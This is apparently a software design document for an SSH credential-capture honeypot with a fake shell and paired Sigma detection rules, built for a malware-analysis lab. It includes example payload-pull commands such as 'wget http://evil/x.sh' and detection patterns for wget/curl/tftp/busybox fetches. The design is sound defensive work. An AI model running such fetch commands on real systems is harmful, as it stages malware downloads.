<!-- SPDX-License-Identifier: GPL-3.0-or-later -->
# Design: SSH credential-capture honeypot + fake shell + paired detections

**Date:** 2026-06-30
**Status:** Approved (pre-implementation)
**Backlog item:** new service emulator (additive) — SSH

## Summary

Add an SSH service so a malware sample that brute-forces or laterally moves over
SSH keeps talking instead of hitting a closed port. The service completes a real
SSH key exchange (via `asyncssh`), captures **every credential attempt**
(username/password/method), and — after a configurable threshold or a weak-credential
match — grants a **fake shell** that captures post-auth commands (recon, and
second-stage payload-pull URLs) while **executing nothing and reaching nothing**.
Three telemetry streams are emitted and the two behavioural signals are each
paired with a Sigma rule.

In a single-sample analysis lab there are no real administrators, so any SSH
authentication is already suspicious and a brute-force-then-shell sequence is a
strong lateral-movement / loader tell.

## Goals

- A believable SSH endpoint (OpenSSH-like banner, real KEX) that captures
  brute-force credentials and offered auth methods.
- After auth, a minimal fake shell that records the sample's commands and, in
  particular, the URL/host of any payload-pull (`wget`/`curl`/`tftp`/`busybox`).
- Emit `credentials` (context) per attempt and pair two SIGNAL tags
  (`ssh-bruteforce`, `ssh-payload-pull`) with Sigma rules — closing detection
  pairing in the same change.

## Non-goals (YAGNI)

- **No real command execution, no real filesystem, no real network egress** from
  shell commands (see Scope guardrail). Payload URLs are logged, never fetched.
- No SFTP/SCP file transfer, no port-forwarding/tunneling, no agent forwarding.
- No public-key auth *acceptance* (offered/queried methods are logged; only
  password / keyboard-interactive can lead to a session).
- No persistent fake-filesystem state across commands beyond canned responses.
- No model-backed shell responses.

## Dependency

Adds **`asyncssh`** (`>=2.14`) to `pyproject.toml` `dependencies`. This is the
project's **first compiled dependency** (it pulls in `cryptography`) — a
deliberate departure from the stdlib-only ethos, justified because SSH
credentials are only transmitted after the encrypted key exchange, which cannot
be emulated without real crypto. `asyncssh` is asyncio-native, so it fits the
orchestrator's async `start()`/`stop()` contract directly. README dependency
note + `requirements`/packaging updated.

**Implementation risk (validate in plan step 1):** confirm `asyncssh` +
`cryptography` install and import cleanly on the project's test interpreter
(py3.14 `.venv`), and spike the server-side auth-retry behaviour (how many
password attempts `asyncssh` surfaces per connection) before building on it.

## Current state

There is no SSH service. `src/lyrebird/mimicry.py` already *recognises* SSH
banners (`SSH-` prefix, port 22 in its protocol map) for the traffic-mimicry
analytic, but nothing answers on 22, so a sample's SSH activity is currently
unobserved (it is not even a `tcp_sink` port). `credentials` is an existing
**context** tag (emitted by imap/pop3/ftp/smtp, declared in
`tests/test_detection_pairing.py`); this service reuses it.

## Architecture

Two new files plus the usual registry/config wiring.

### `src/lyrebird/services/ssh.py` — `SSHService(BaseService)`

- `start()` loads or generates a persistent host key (see below) and calls
  `asyncssh.create_server(handler_factory, host=bind_address, port=cfg.port,
  server_host_keys=[host_key], server_version=<from banner cfg>)`. The returned
  object is an asyncio server; `stop()` closes it and awaits `wait_closed()`
  exactly like the other services.
- A per-connection `asyncssh.SSHServer` subclass:
  - `connection_made(conn)` — record peer and the client version banner
    (`conn.get_extra_info('client_version')`); init `attempts = 0`.
  - `password_auth_supported()` / `kbdint_auth_supported()` → `True`;
    `public_key_auth_supported()` → `False` (queried key methods are still
    logged, but cannot succeed).
  - `validate_password(username, password)`: `attempts += 1`; **emit a
    `credentials` context event** `{user, password, method:"password",
    accepted}`. Accept (return `True`) iff `(username,password)` matches a
    configured `weak_creds` entry **or** `attempts >= accept_after`; else
    `False`. Keyboard-interactive maps to the same logic.
  - `connection_lost` / session end: if `attempts >= bruteforce_threshold`,
    **emit the `ssh-bruteforce` SIGNAL** once for the connection
    `{attempts, client_version, accepted}`.
- On an accepted session, an interactive `SSHServerProcess` (set via the
  server's `process_factory`) presents a prompt and reads commands line-by-line
  from `stdin`, delegating each to the command emulator and writing its canned
  output to `stdout`. (`process_factory` is asyncssh's simplest path for a
  line-oriented canned shell; no PTY/terminal emulation.) Each command is logged (see
  Telemetry).

### `src/lyrebird/services/ssh_shell.py` — command emulator

A pure, side-effect-free function `respond(command: str) -> tuple[str, dict|None]`
returning `(canned_output, payload_pull_info_or_None)`:

- Canned inert responses for common recon commands: `uname`/`uname -a`, `id`,
  `whoami`, `pwd`, `ls`, `cat /etc/passwd`, `ps`, `w`, `hostname`. A generic
  fallback (`<cmd>: command not found` or an empty success) for anything else.
- **Payload-pull recognition:** if the command invokes `wget`/`curl`/`tftp`/
  `busybox … (wget|tftp)` with a URL or host, extract `{tool, url, command}` and
  return it as the second tuple element; the canned output mimics a benign
  success (e.g. a short fake transfer line) without performing anything.
- No filesystem, no subprocess, no socket. Deterministic and unit-testable in
  isolation.

### Host key

Persisted at `data_dir/ssh/host_key` (created on first run via
`asyncssh.generate_private_key('ssh-ed25519')`, written with `0600`). Loaded on
subsequent runs so the host fingerprint is stable across lab restarts. The
directory is created if missing.

## Scope guardrail (non-negotiable — per SCOPE.md)

The fake shell **captures and responds; it never acts.** Specifically: no command
is ever executed, no real path is read or written, and **no payload is ever
fetched** — a `wget http://evil/x.sh` is parsed for its URL (the IOC we want)
and answered with a canned, inert result; it does not touch the network. This is
the same egress line drawn for realistic DNS mode in SCOPE.md: *capture intent,
perform nothing.* This guardrail is asserted by a test (see Testing) so it cannot
silently regress.

## Telemetry

Tags emitted by this service: `credentials` (existing context), `ssh-bruteforce`
(new signal), `ssh-payload-pull` (new signal). No new **context** tag is
introduced (ordinary captured commands are emitted with no tag).

- **Per auth attempt** — `event_type="auth"`, `transport="tcp"`,
  `tags=["credentials"]`,
  `request={"user", "password", "method", "accepted": bool}`,
  summary e.g. `ssh auth user='root' accepted=false`.
- **Per connection (brute-force)** — once, when `attempts >= bruteforce_threshold`:
  `event_type="request"`, `tags=["ssh-bruteforce"]`,
  `request={"attempts": int, "client_version": str, "accepted": bool}`,
  summary e.g. `ssh brute-force 5 attempts client='SSH-2.0-libssh2_1.10' accepted=true`.
- **Per shell command** — `event_type="request"`, `request={"command": str}`,
  summary e.g. `ssh shell: uname -a`. **No tag** for ordinary commands. When the
  command is a payload-pull, add `tags=["ssh-payload-pull"]` and
  `request={"command", "tool", "url"}`, summary e.g.
  `ssh payload-pull wget http://10.0.0.9/x.sh`.

## Detections (paired)

Two new rules under `detections/sigma/`, each `logsource: product: lyrebird,
service: ssh`, `condition: selection`:

1. `ssh_bruteforce.yml`
   - `selection: { service: 'ssh', tags|contains: 'ssh-bruteforce' }`
   - `fields: src_ip, request.attempts, request.client_version, request.accepted`
   - `level: medium`; falsepositives: legitimate admin automation / scanners use
     repeated SSH auth outside a single-sample lab.

2. `ssh_shell_payload_pull.yml`
   - `selection: { service: 'ssh', tags|contains: 'ssh-payload-pull' }`
   - `fields: src_ip, request.tool, request.url, request.command`
   - `level: high`; falsepositives: an admin fetching a file via an SSH shell.

`ssh-bruteforce` and `ssh-payload-pull` are **signals** (paired by these rules)
and must **NOT** be added to `CONTEXT_OR_ANALYTIC_TAGS`. `credentials` is already
declared context there — unchanged.

## Config

`DEFAULTS["services"]["ssh"]` in `src/lyrebird/config.py`:

```python
"ssh": {"enabled": True, "port": 22,
        "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
        "accept_after": 3,        # grant a session on the Nth attempt (any creds)
        "weak_creds": [],         # optional accept-on-match, e.g. [{"user":"root","password":"root"}]
        "bruteforce_threshold": 3}  # emit ssh-bruteforce once attempts reach this
```

- `banner`: advertised server identification. `asyncssh` prepends `SSH-2.0-`, so
  the version token after that prefix is what is passed as `server_version`
  (handle the prefix in the service).
- `accept_after`: guarantees the shell phase is reachable for any brute-forcer.
- `weak_creds`: optional realism; an empty list means "accept-after-N only".
- `bruteforce_threshold`: volume at which the brute-force signal fires.

## Error handling / edge cases

- Host-key generate/load failure: log and leave the service disabled rather than
  crash the orchestrator.
- The `validate_password` / shell handlers are exception-guarded; an asyncssh
  connection dropped mid-session must not propagate out of the handler.
- A connection that authenticates (weak-cred match) on attempt 1 still emits the
  `credentials` event; `ssh-bruteforce` fires only if `attempts >=
  bruteforce_threshold`.
- A session that opens but sends no command emits no command event (no shell
  noise).
- asyncssh server version prefix (`SSH-2.0-`) handled so the configured banner is
  not double-prefixed.

## Testing

New `tests/test_ssh_service.py`, using `asyncssh` as the **client** with the
one-event-loop + poll-for-artifact pattern (client and server share a single
`asyncio.run`; `known_hosts=None`). `tests/test_ssh_shell.py` unit-tests the
command emulator in isolation.

- **Brute-force → deny → accept:** with `accept_after=3`, drive ≥3 password
  attempts; assert each emits a `credentials` event (with `accepted` false then
  true), that the session is granted on the 3rd, and that one `ssh-bruteforce`
  event reports the attempt count + client banner.
- **Weak-cred accept:** with `weak_creds=[{user:"root",password:"root"}]`, assert
  `root/root` is accepted on attempt 1.
- **Shell capture + payload-pull:** on an accepted session run `uname -a` and
  `wget http://10.0.0.9/x.sh`; assert canned output is returned, a command event
  is logged for each, and the `wget` emits `ssh-payload-pull` with the extracted
  URL. **Assert nothing was fetched** (the emulator is pure — verified by the
  unit test asserting no network/FS access path exists; the integration test
  asserts the canned output, not a real transfer).
- **Command emulator unit tests:** recon commands → expected canned strings;
  payload-pull parsing extracts tool+url for `wget`/`curl`/`tftp`/`busybox`;
  unknown command → fallback.
- **Host-key persistence:** the key file is created on first start and reused on
  the second (same fingerprint).
- Registry/instantiation covered by `tests/test_phase3_services.py` (extend if
  it enumerates services).
- Regenerate `REFERENCE.md` and run the **full** suite + `scripts/lint_sigma.py`
  so the pairing guard and reference guard both pass.

## Acceptance criteria

- `ssh` registered in `orchestrator.REGISTRY`, configurable, emits structured
  events via `self.emit(...)`.
- Brute-force captured as `credentials` (context) per attempt + one
  `ssh-bruteforce` signal per qualifying connection.
- Accepted session yields a fake shell that logs commands and emits
  `ssh-payload-pull` for payload-fetch commands — fetching nothing.
- `ssh_bruteforce.yml` + `ssh_shell_payload_pull.yml` exist, lint clean, pair the
  signals; pairing guard passes without touching `CONTEXT_OR_ANALYTIC_TAGS`.
- `asyncssh` added to deps and imports on the test interpreter; `REFERENCE.md`
  regenerated; full suite green; SPDX headers on all new files; commits
  DCO-signed (plain `git commit -s`, with the `Co-Authored-By: Claude` trailer).

## Files touched

- `pyproject.toml` (add `asyncssh` dependency)
- `src/lyrebird/services/ssh.py` (new)
- `src/lyrebird/services/ssh_shell.py` (new — command emulator)
- `src/lyrebird/orchestrator.py` (register `SSHService`)
- `src/lyrebird/config.py` (ssh defaults)
- `detections/sigma/ssh_bruteforce.yml` (new, paired)
- `detections/sigma/ssh_shell_payload_pull.yml` (new, paired)
- `tests/test_ssh_service.py` (new), `tests/test_ssh_shell.py` (new)
- `README.md` (Services table row + dependency note)
- `REFERENCE.md` (regenerated)
